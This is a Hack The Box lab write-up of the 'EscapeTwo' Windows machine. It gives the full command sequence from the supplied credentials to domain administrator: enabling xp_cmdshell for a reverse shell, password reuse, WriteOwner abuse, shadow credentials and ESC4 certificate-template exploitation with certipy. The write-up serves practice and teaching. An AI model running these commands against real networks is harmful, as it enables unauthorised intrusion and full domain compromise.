---
date: 2025-05-25T10:56:05-05:00
# description: ""
image: "/images/HTB-Administrator/EscapeTwo.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: EscapeTwo"
type: "post"
---

* Platform: Hack The Box
* Link: [EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
* Level: Easy
* OS: Windows
---

> We are provided credentials to start on this box for the following account: **Username:** rose **Password:** KxEPkKe6R8su.

EscapeTwo is an assumed-breach Active Directory scenario. Using the initial credentials, we identify a file containing database access credentials. These are leveraged to enable and abuse `xp_cmdshell`, providing remote command execution and an initial foothold on the system.

Post-exploitation enumeration reveals additional credentials stored within an application configuration file, allowing lateral movement to a domain user. Utilizing BloodHound for privilege path analysis, we observe that this account possess the `WriteOwner` rights over a service account. By abusing this misconfiguration, we take over the service account which we use to exploit the ESC4 attack path, resulting in full administrative access.

## Scanning

```
nmap -sC -sV -Pn -oA nmap/EscapeTwo {IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 15:57 CST
Nmap scan report for 10.129.33.0
Host is up (0.060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-11 21:58:09Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.33.0:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-11T19:22:43
|_Not valid after:  2055-01-11T19:22:43
| ms-sql-ntlm-info: 
|   10.129.33.0:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-11T21:59:29+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-11T21:58:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.32 seconds
```

The target is running Active Directory with the usual services such as LDAP, SMB, in additional to Microsoft SQL.

We also have some domain names that we add to the `/etc/hosts` file.

```
sudo echo "TARGET_IP sequel.htb DC01.sequel.htb DC01" | sudo tee -a /etc/hosts
```

## Enumeration

We use the provided credentials to enumerate the available shares.

```
netexec smb TARGET_IP -u rose -p 'KxEPkKe6R8su' --shares
```

![SMB shares enumeration](/images/HTB-EscapeTwo/rose_smb.png)

We have access to some shares let's look into `Accounting Department`. Inside we find two files that we download `accounting_2024.xlsx` and `accounts.xlsx`.

```
smbclient //sequel.htb/'Accounting Department' -U rose
```

![acct dept share access](/images/HTB-EscapeTwo/acc_dpt_share.png)

Inside `accounts.xlsx` we find some files.

![accounts.xlsx file](/images/HTB-EscapeTwo/creds_file.png)

We can read the file `sharedStrings.xml` where we find the credentials for the `sa` account.

> The `sa` account, or system administrator account, is a built-in account in SQL Server that gives the user full administrative access to the SQL Server instance.

![sa account credentials](/images/HTB-EscapeTwo/sa_creds.png)

Using the command below we login into the database.

```
impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb'
```

![mssql login](/images/HTB-EscapeTwo/mssql_login.png)

## Initial Foothold

We enable `xp_cmdshell` with the following queries.

> `xp_cmdshell` is an extended stored procedure in Microsoft SQL Server that allows you to execute operating system commands directly from SQL Server.

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

![enable xp_cmdshell](/images/HTB-EscapeTwo/xp_cmdshell_enabled.png)

We test it with `EXEC xp_cmdshell 'whoami';`. 

![xp_cmdshell test](/images/HTB-EscapeTwo/xp_cmdshell_test.png)

We can now abuse mssql to obtain a reverse shell. On [revshells](https://www.revshells.com/) we use the `PowerShell #3 (Base64)`.

```
xp_cmdshell REVERSE_SHELL_COMMAND
```

![mssql reverse shell](/images/HTB-EscapeTwo/mssql_revshell.png)

On our listener we get a connection as `sql_svc`.


![foothold](/images/HTB-EscapeTwo/foothold.png)

This account does not have the user flag.

### Shell as ryan

We see a user `ryan` besides the `Administrator`.

![users list](/images/HTB-EscapeTwo/users_list.png)

In `C:\SQL2019\ExpressAdv_ENU` we find `sql-Configuration.INI` containing another password `WqSZAF6CysDQbGb3`.

![sql config password](/images/HTB-EscapeTwo/sqlsvc_pwd.png)

Using this password we are able to login as `ryan`.

```
evil-winrm -i sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3'
```

![ryan login](/images/HTB-EscapeTwo/ryan_login.png)

The user flag is in `C:\Users\ryan\Desktop`.

## Privilege Escalation

Let's start enumerating with BloodHound.

```
bloodhound-python -c all -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc dc01.sequel.htb -ns 10.129.33.0
```

![bloodhound enumeration](/images/HTB-EscapeTwo/bloodhound.png)

Launch BloodHound with 

```
sudo neo4j start
bloodhound --no-sandbox
```

Ryan has the `WriteOwner` permission on `CA_SVC` which we can use to take over the account.

![ryan WriteOwner](/images/HTB-EscapeTwo/ryan_WriteOwner.png)

![WriteOwner help](/images/HTB-EscapeTwo/WriteOwner_help.png)

Checking some information about the `ca_svc` account, we learn that it is part of the `Cert Publishers` group.

![ca_svc account info](/images/HTB-EscapeTwo/ca_svc_group.png)

We learn more information about this group on a Microsoft documentation page available [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups).

![cert publishers group info](/images/HTB-EscapeTwo/cert_publishers_group.png)

Our exploitation will have two main steps. First we need to gain control of `ca_svc` which we can do thanks to `WriteOwner` and the second step is abusing Active Directory Certificate Services (ADCS).

1. Gain Ownership of the `ca_svc` Account.

```
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
```

![bloodyAD](/images/HTB-EscapeTwo/bloodyAD.png)

2. Grant `ryan` Full Control over `ca_svc`.

> You can download `dacledit.py` [here](https://github.com/fortra/impacket/blob/master/examples/dacledit.py).

```
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

![dacledit](/images/HTB-EscapeTwo/dacledit.png)


3. Exploit `ca_svc` using ADCS Shadow Credentials.

```
certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip {ip} -ns {ip} -target dc01.sequel.htb -account ca_svc
```

![shadow credentials exploit](/images/HTB-EscapeTwo/certipy_shadow.png)


4. Enumerate vulnerable certificate templates.

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip {ip} -vulnerable -stdout
```

![certificate enumeration](/images/HTB-EscapeTwo/vulnerable_template.png)

![template name](/images/HTB-EscapeTwo/Template_Name.png)

![ESC4](/images/HTB-EscapeTwo/ESC4.png)

5. Abuse the Vulnerable Certificate Template.

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip {ip}
```

![Template Abuse](/images/HTB-EscapeTwo/Template_Abuse.png)

6. Request a Certificate for the Administrator.

```
certipy-ad req -u ca_svc -hashes {ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
```

![certificate request](/images/HTB-EscapeTwo/certificate_request.png)

7. Authenticate as Administrator using the Certificate.

```
certipy-ad auth -pfx ./administrator.pfx -dc-ip {ip}
```

![Admin hash](/images/HTB-EscapeTwo/Admin_hash.png)

8. Login as Administrator and read the root flag.

```
evil-winrm -i dc01.sequel.htb -u administrator -H {admin_hash}
```

![Admin login](/images/HTB-EscapeTwo/root_flag.png)

Thank you for reading this write up! If you want to read more about the ESC4 attack and how to exploit it, check [this article](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/).





